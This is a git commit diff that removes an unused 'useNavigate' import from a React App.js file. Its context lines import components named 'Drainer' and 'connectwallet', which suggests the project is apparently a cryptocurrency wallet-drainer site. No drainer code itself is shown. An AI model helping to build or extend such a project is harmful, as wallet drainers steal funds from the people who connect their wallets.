24ac242b275a5577c2a20bd4f3344bb8c9970d82
ugbodagadave <ugbodagadavid@gmail.com>
2025-07-20 02:12:24 +0100

    Update App.js

--- client/src/App.js
+++ client/src/App.js
@@ -1,5 +1,5 @@
 import React from 'react';
-import { BrowserRouter as Router, Routes, Route, useNavigate } from 'react-router-dom';
+import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
 import DrainerHero from './components/Drainer';
 import Connect from './components/connectwallet'; 
 
